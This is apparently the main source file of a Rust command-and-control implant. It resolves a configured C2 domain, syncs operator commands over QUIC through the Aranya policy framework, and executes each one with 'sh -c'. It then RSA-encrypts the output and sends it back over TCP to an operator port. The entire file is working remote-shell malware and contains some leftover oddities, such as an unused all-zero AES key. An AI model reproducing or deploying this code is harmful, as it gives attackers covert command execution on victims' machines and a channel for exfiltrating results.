mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
        TcpStream
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
    path::{Path, PathBuf},
    fs,
    io::Write
};
use aes::{Aes256, cipher::{KeyInit, generic_array::GenericArray}};
use aranya_policy_ifgen::Actionable;
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::{BaseId, Rng};
use rsa::{BigUint, Oaep, RsaPublicKey, sha2::Sha256, traits::PaddingScheme};
use s2n_quic::Client;
use tokio::time::{Duration, sleep};
use crate::{c2syncer::{AM, C2Syncer, c2push, c2sync, new_quic_client, run_c2syncer}, common::{C2Client, FastChannelMessage}, policy::{Command, Effect, EphemeralAction, get_owner_key}};
use tokio::sync::Mutex;
use chrono::prelude::*;
use rand::{RngExt, seq::IndexedRandom};

struct C2Sink {
    pub commands: Vec<String>,
    // Owners current public key (n, e)
    pub n: Vec<u8>,
    pub e: Vec<u8>
}

impl C2Sink {
    pub fn new() -> Self {
        Self {
            commands: Vec::new(),
            n: Vec::new(),
            e: Vec::new()
        }
    }
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        match Effect::try_from(effect) {
            Ok(Effect::Command(cmd)) => {
                self.commands.push(cmd.cmdline.trim().to_string());
            },
            Ok(Effect::QueryOwnerKeyResult(key)) => {
                self.n = key.n;
                self.e = key.e;
            },
            Err(_) => {}
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

// Null sink for ephemeral actions - it will do nothing
struct NullSink;

impl Sink<&[u8]> for NullSink {
    fn begin(&mut self) {}
    
    fn consume(&mut self, effect: &[u8]) {}

    fn rollback(&mut self) {}
    
    fn commit(&mut self) {}
}

fn generate_random_directory() -> PathBuf {
    let mut randdir = [0u8; 10];

    let mut rng = rand::rng();
    for i in 0..10 {
        randdir[i] = rng.sample(rand::distr::Alphanumeric);
    }

    return std::env::temp_dir()
        .join(Path::new(std::str::from_utf8(&randdir).unwrap()));
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt().init();

    // TODO: TEMPORARY
    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);
    let args: Vec<String> = std::env::args().collect();
    let bind: SocketAddr = args[1].parse()
        .expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");
    // TODO: END TEMPORARY

    // Generate random directory
    let basedir = generate_random_directory();

    let _ = fs::create_dir(&basedir);

    let sink = C2Sink::new();

    let mut aranya = C2Client::new(&basedir);
    let keys = aranya.create_new_keys();
    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let mut cs = aranya.init_aranya(policy);

    let graph = GraphId::from_bytes(config::GRAPH_BIN.try_into().unwrap());
    aranya.set_graph(graph);

    let mut syncer = C2Syncer::new(cs, sink);

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();

    for host in ips {
        syncer.connections.push(
            SocketAddr::new(host, config::PORT)
        );
    }

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async move {
        let quic = {
            let mut syncbind = bind.clone();
            syncbind.set_port(4446);
            new_quic_client(syncbind)
        };

        let syncer = Arc::new(Mutex::new(syncer));

        tokio::spawn(
            run_c2syncer(
                Arc::clone(&syncer),
                quic,
                bind
            )
        );

        loop {
            sleep(Duration::from_millis(1000)).await;

            let commands =  {
                let syncer = &mut *syncer.lock().await;
                let sink = &mut syncer.sink;
                let commands = syncer.sink.commands.clone();
                syncer.sink.commands.clear();

                commands
            };

            for cmd in commands {
                // TODO: Check for other shells?
                let out = std::process::Command::new("sh")
                    .args(["-c", &cmd])
                    .output()
                    .expect("command error");

                let syncer = &mut *syncer.lock().await;
                let sink = &mut syncer.sink;

                match syncer.clientstate.session(graph) {
                    Err(_) => {},
                    Ok(mut session) => {

                        let mut nullsink = NullSink;
                        get_owner_key().with_action(|action| {
                            session.action(
                                &syncer.clientstate,
                                &mut *sink,
                                &mut nullsink,
                                action
                            );
                        });

                        let ownerpub = RsaPublicKey::new(
                            BigUint::from_bytes_be(&sink.n),
                            BigUint::from_bytes_be(&sink.e)
                        ).expect("Could not create public key");

                        let message = FastChannelMessage::CommandExecuted {
                            data: out.stdout.to_vec()
                        };

                        let key = GenericArray::from([0u8; 16]);
                        let aes = Aes256::new(&key);

                        let data = postcard::to_allocvec(&message)
                            .expect("Could not serialise message");

                        let mut rng = Rng;
                        let ciphertext = ownerpub.encrypt(
                            &mut rng,
                            Oaep::new::<Sha256>(),
                            &data
                        ).expect("Failed to encrypt");


                        // TODO: Can cause unecessary blocking ?
                        match TcpStream::connect("127.0.0.1:4446") {
                            Err(_) => {
                                println!("Could not connect back to operator");
                            },
                            Ok(mut stream) => {
                                stream.write(&ciphertext);
                            }
                        }
                    }
                }
            }
        }
    });
}
